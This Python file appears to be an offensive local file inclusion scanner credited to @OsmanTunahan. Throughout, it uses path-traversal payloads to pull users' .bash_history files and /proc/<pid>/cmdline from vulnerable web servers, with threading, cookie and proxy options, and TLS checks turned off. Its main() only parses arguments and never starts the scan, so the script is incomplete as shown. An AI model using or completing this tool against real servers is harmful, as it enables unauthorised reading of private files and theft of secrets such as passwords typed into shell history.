from multiprocessing import Pool
import requests
import argparse
import signal
import re

class HTTPClient:
    def __init__(self, headers=None, proxies=None):
        self.headers = headers or {"Connection": "close"}
        self.proxies = proxies or {}
        requests.packages.urllib3.disable_warnings()

    def get(self, url):
        return requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False, verify=False)
    

# Base Output Handler Class
class OutputHandler:
    def write_output(self, lines):
        raise NotImplementedError("Subclasses should implement this!")

class FileOutputHandler(OutputHandler):
    def __init__(self, output_file):
        self.output_file = output_file

    def write_output(self, lines):
        with open(self.output_file, 'a') as out_file:
            for line in lines:
                out_file.write(line + "\n")

class ConsoleOutputHandler(OutputHandler):
    def write_output(self, lines):
        for line in lines:
            print(line)


# Base LFI Hunt Class
class LFIHuntBase:
    def __init__(self, url, lfi_payload, check_size, output_handler):
        self.url = url
        self.lfi_payload = lfi_payload
        self.check_size = check_size
        self.output_handler = output_handler

    def hunt(self, payload_suffix):
        raise NotImplementedError("Subclasses should implement this!")

class HistoryLFIHunt(LFIHuntBase):
    def hunt(self, username):
        history_payload = self.url + self.lfi_payload + f"/home/{username}/.bash_history"
        req = HTTPClient().get(history_payload)
        if len(req.text) > self.check_size:
            lines = [
                f"Found: \x1b[6;30;42mHistory File for {username.strip()}\x1b[0m",
                f"\n{req.text}\n",
                "\033[31m" + "*" * 100 + "\x1b[0m"
            ]
            self.output_handler.write_output(lines)
        else:
            print(f"No history file found for user(s) {username.strip()}")
            print("\033[31m" + "*" * 100 + "\x1b[0m")

class ProcessLFIHunt(LFIHuntBase):
    def hunt(self, pid):
        process_payload = self.url + self.lfi_payload + f"/proc/{pid}/cmdline"
        req = HTTPClient().get(process_payload)
        if len(req.text) > self.check_size:
            lines = [
                f"Process: \x1b[6;30;42m/proc/{pid}/cmdline\x1b[0m",
                f"\n{req.text}\n",
                "\033[31m" + "*" * 100 + "\x1b[0m"
            ]
            self.output_handler.write_output(lines)
        else:
            print(f"No process info found for PID {pid}")
            print("\033[31m" + "*" * 100 + "\x1b[0m")

class LFIEngine:
    def __init__(self, url, lfi_payload, check_size, output_handler, threads):
        self.url = url
        self.lfi_payload = lfi_payload
        self.check_size = check_size
        self.output_handler = output_handler
        self.threads = threads

    def run_hunt(self, hunter_class, wordlist):
        original_sigint_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
        pool = Pool(processes=int(self.threads))
        signal.signal(signal.SIGINT, original_sigint_handler)
        
        try:
            hunter = hunter_class(self.url, self.lfi_payload, self.check_size, self.output_handler)
            pool.map(hunter.hunt, wordlist)
        except KeyboardInterrupt:
            pool.terminate()
        else:
            pool.close()
        pool.join()

def main():
    parser = argparse.ArgumentParser(description='LFI Scanner Tool by @OsmanTunahan')
    parser.add_argument('-u', metavar='<URL>', help='Example: -u http://lfi.location/?parameter=', required=True)
    parser.add_argument('-w', metavar='<Wordlist file>', help="Example: -w payloads/unix.txt", required=True)
    parser.add_argument('-l', metavar='<LFI Payload>', help="Example: -l ../../../../../", required=True)
    parser.add_argument('-pid', metavar='<Set max pid value>', default='1000', help="Default is 1000. Example: -pid 2000", required=False)
    parser.add_argument('-o', metavar='<Output file>', help="Example: -o output.txt", required=False)
    parser.add_argument('-t', metavar='<Threads>', default="10", help="Example: -t 100. Default 10", required=False)
    parser.add_argument('-H', metavar='<Header>', help="Example -H 'Parameter: Value'", required=False)
    parser.add_argument('-c', metavar='<Cookie>', help="Example -c 'Cookie Value'", required=False)
    parser.add_argument('-a', metavar='<User-Agent>', help="Example: -a Linux", required=False)
    parser.add_argument('-p', metavar='<Proxies>', help="Example: -p 127.0.0.1:8080", required=False)
    args = parser.parse_args()

if __name__ == "__main__":
    main()